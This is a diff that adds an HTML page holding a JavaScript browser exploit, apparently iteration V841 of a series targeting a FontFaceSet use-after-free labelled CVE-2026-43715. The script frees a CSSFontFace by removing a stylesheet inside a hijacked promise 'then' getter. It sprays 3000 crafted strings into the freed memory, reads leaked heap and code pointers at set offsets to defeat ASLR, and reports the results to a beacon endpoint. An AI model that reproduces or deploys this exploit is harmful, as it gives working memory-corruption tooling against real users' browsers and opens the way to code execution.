@@ -1,0 +1,194 @@
+<!DOCTYPE html><html><head><meta charset="utf-8"><title>V841</title>
+<meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate">
+<meta http-equiv="refresh" content="180"></head>
+<body><pre id="out">V841 -- CSSFontFace extended scan: +104 +136 +168 pointer extraction</pre>
+<script>
+'use strict';
+// V841: Same V804 FontFaceSet UAF mechanism, extended to scan +136 and +168
+// Goal: P0 code ASLR defeat via Timer vtable at +136, heap ptr at +168
+// Uses CVE-2026-43715 FontFaceSet iterateClients UAF
+// Single UAF. Beacon instrumented.
+var O=document.getElementById('out');
+function say(s){O.textContent+='\n'+s;}
+var bp=[];for(var i=0;i<1200;i++)bp.push(new Image());
+var bi=0,sq=0;
+function B(tag,data){
+  var s=String(sq).padStart(3,'0');sq++;
+  var url='/beacon/V841-'+s+'-'+tag;
+  if(data!==undefined)url+='?d='+encodeURIComponent(String(data).substring(0,900));
+  if(bi<bp.length){bp[bi].src=url;bi++;}
+  say('['+s+'] '+tag+(data!==undefined?': '+String(data).substring(0,200):''));
+}
+
+function ptrHex(c0,c1,c2,c3){
+  try{
+    var ab=new ArrayBuffer(8);
+    var u16=new Uint16Array(ab);
+    u16[0]=c0;u16[1]=c1;u16[2]=c2;u16[3]=c3;
+    var u64=new BigUint64Array(ab);
+    return '0x'+u64[0].toString(16).padStart(16,'0');
+  }catch(e){
+    return '0x'+('0000'+c3.toString(16)).slice(-4)+('0000'+c2.toString(16)).slice(-4)+
+           ('0000'+c1.toString(16)).slice(-4)+('0000'+c0.toString(16)).slice(-4);
+  }
+}
+
+B('BOOT','v841-extended-ptrscan|+104+136+168');
+
+// S0: API checks
+var hasFF=typeof FontFace!=='undefined';
+var hasFS=typeof document.fonts!=='undefined';
+var hasFSload=hasFS&&typeof document.fonts.load==='function';
+B('ENTER-S0','FF='+hasFF+'|FS='+hasFS+'|load='+hasFSload);
+if(!hasFF||!hasFSload){B('FAIL-S0','missing-api');throw 0;}
+B('PASS-S0','api-ok');
+
+// S1: Font setup -- identical to V804
+var faceA=new FontFace('a','local(Helvetica)',{unicodeRange:'U+0041'});
+document.fonts.add(faceA);
+B('PASS-S1-A','face-a-added|status='+faceA.status);
+
+var styleEl=document.createElement('style');
+styleEl.textContent='@font-face{font-family:x;src:local(Arial);unicode-range:U+0042;}';
+document.head.appendChild(styleEl);
+B('PASS-S1-X','stylesheet-x-added');
+
+var promiseA=faceA.loaded;
+B('PASS-S1-MAT','loaded-promise-materialized');
+
+// S2: Build spray template -- zeroed with m_status=3(Success) at char 55
+var SPRAY_LEN=86;
+var sprayChars=new Array(SPRAY_LEN);
+for(var c=0;c<SPRAY_LEN;c++) sprayChars[c]=0x0000;
+sprayChars[55]=0x0003; // m_status = Success(3) at byte 130 = char 55
+B('PASS-S2-TPL','len='+SPRAY_LEN+'|c55=0x0003');
+
+var thenFired=false;
+var sprayStrings=[];
+
+// Install FontFace.prototype.then getter -- triggers during promise resolution
+Object.defineProperty(FontFace.prototype,'then',{
+  get:function(){
+    if(thenFired) return undefined;
+    thenFired=true;
+    B('ENTER-S3-THEN','getter-fired');
+
+    // Remove stylesheet to destroy CSSFontFace for 'x'
+    try{
+      styleEl.parentNode.removeChild(styleEl);
+      B('PASS-S3-RM','stylesheet-removed');
+    }catch(e){B('FAIL-S3-RM',e.message);}
+
+    // Force layout rebuild
+    try{
+      document.body.offsetHeight;
+      B('PASS-S3-REBUILD','layout-forced');
+    }catch(e){B('FAIL-S3-REBUILD',e.message);}
+
+    // Spray 3000 strings at 192B (same as V804)
+    for(var s=0;s<3000;s++){
+      sprayChars[85]=s&0xFFFF;
+      sprayStrings.push(String.fromCharCode.apply(null,sprayChars));
+    }
+    sprayChars[85]=0;
+    B('PASS-S3-SPRAY','n='+sprayStrings.length);
+
+    return undefined;
+  },
+  configurable:true
+});
+B('PASS-S2-THEN','getter-installed');
+
+// S3: Trigger -- fonts.load causes iterateClients, which hits the then getter
+B('ENTER-S3-LOAD','calling-fonts.load');
+document.fonts.load('1em a, x','AB').then(function(faces){
+  var fc=faces?faces.length:'null';
+  B('PASS-S3-RESOLVE','faces='+fc);
+
+  // Immediate scan at +104 (chars 42-45) for non-zero = heap ptr
+  var winIdx=-1,hitCount=0;
+  for(var s=0;s<sprayStrings.length;s++){
+    var c42=sprayStrings[s].charCodeAt(42);
+    var c43=sprayStrings[s].charCodeAt(43);
+    if(c42!==0||c43!==0){
+      hitCount++;
+      if(winIdx<0) winIdx=s;
+    }
+  }
+
+  if(winIdx>=0){
+    var ws=sprayStrings[winIdx];
+
+    // Extract pointer at +104 (chars 42-45) -- m_wrapper, CONFIRMED by V804
+    var p104=ptrHex(ws.charCodeAt(42),ws.charCodeAt(43),ws.charCodeAt(44),ws.charCodeAt(45));
+    B('PASS-S4-P104','HEAP|idx='+winIdx+'|ptr='+p104+'|hits='+hitCount);
+
+    // Extract pointer at +136 (chars 58-61) -- Timer vtable? CODE ptr?
+    var c58=ws.charCodeAt(58),c59=ws.charCodeAt(59),c60=ws.charCodeAt(60),c61=ws.charCodeAt(61);
+    var p136=ptrHex(c58,c59,c60,c61);
+    var p136nz=(c58!==0||c59!==0||c60!==0||c61!==0);
+    B('PASS-S4-P136',(p136nz?'LIVE':'ZERO')+'|ptr='+p136);
+
+    // Extract pointer at +168 (chars 74-77) -- m_thread? heap ptr?
+    var c74=ws.charCodeAt(74),c75=ws.charCodeAt(75),c76=ws.charCodeAt(76),c77=ws.charCodeAt(77);
+    var p168=ptrHex(c74,c75,c76,c77);
+    var p168nz=(c74!==0||c75!==0||c76!==0||c77!==0);
+    B('PASS-S4-P168',(p168nz?'LIVE':'ZERO')+'|ptr='+p168);
+
+    // Also check +88 (chars 34-37) -- m_clients from V804
+    var c34=ws.charCodeAt(34),c35=ws.charCodeAt(35),c36=ws.charCodeAt(36),c37=ws.charCodeAt(37);
+    var p88=ptrHex(c34,c35,c36,c37);
+    var p88nz=(c34!==0||c35!==0||c36!==0||c37!==0);
+    B('PASS-S4-P88',(p88nz?'LIVE':'ZERO')+'|ptr='+p88);
+
+    // Full diff scan -- report ALL non-zero chars (except known: c55=0x0003, c85=idx)
+    var mods=[];
+    for(var ch=0;ch<SPRAY_LEN;ch++){
+      var exp;
+      if(ch===55) exp=0x0003;
+      else if(ch===85) exp=winIdx&0xFFFF;
+      else exp=0x0000;
+      var got=ws.charCodeAt(ch);
+      if(got!==exp) mods.push('c'+ch+'=0x'+got.toString(16));
+    }
+    B('PASS-S4-DIFF','n='+mods.length+(mods.length?'|'+mods.slice(0,30).join('|'):''));
+
+    // If we have multiple hits, check consistency across hits
+    if(hitCount>=2){
+      var ws2=sprayStrings[winIdx+1<sprayStrings.length?winIdx+1:winIdx];
+      // Find next actual hit
+      for(var s2=winIdx+1;s2<sprayStrings.length;s2++){
+        if(sprayStrings[s2].charCodeAt(42)!==0||sprayStrings[s2].charCodeAt(43)!==0){
+          ws2=sprayStrings[s2];
+          var p104b=ptrHex(ws2.charCodeAt(42),ws2.charCodeAt(43),ws2.charCodeAt(44),ws2.charCodeAt(45));
+          var p136b=ptrHex(ws2.charCodeAt(58),ws2.charCodeAt(59),ws2.charCodeAt(60),ws2.charCodeAt(61));
+          var p168b=ptrHex(ws2.charCodeAt(74),ws2.charCodeAt(75),ws2.charCodeAt(76),ws2.charCodeAt(77));
+          B('PASS-S4-HIT2','s='+s2+'|p104='+p104b+'|p136='+p136b+'|p168='+p168b);
+          break;
+        }
+      }
+    }
+
+  } else {
+    B('FAIL-S4-NOHIT','0 hits in '+sprayStrings.length+' strings');
+  }
+
+  B('DONE','alive|hits='+hitCount);
+
+}).catch(function(e){
+  B('FAIL-S3-REJECT',String(e&&e.message||e));
+});
+
+// S5: Delayed scan for late writes (1.5s)
+setTimeout(function(){
+  B('ENTER-S5','delayed-scan');
+  var lateHits=0;
+  for(var s=0;s<sprayStrings.length;s++){
+    var c42=sprayStrings[s].charCodeAt(42);
+    if(c42!==0) lateHits++;
+  }
+  B('PASS-S5','late-hits='+lateHits+'|then='+thenFired);
+},1500);
+
+B('PASS-INIT','v841-ready');
+</script></body></html>
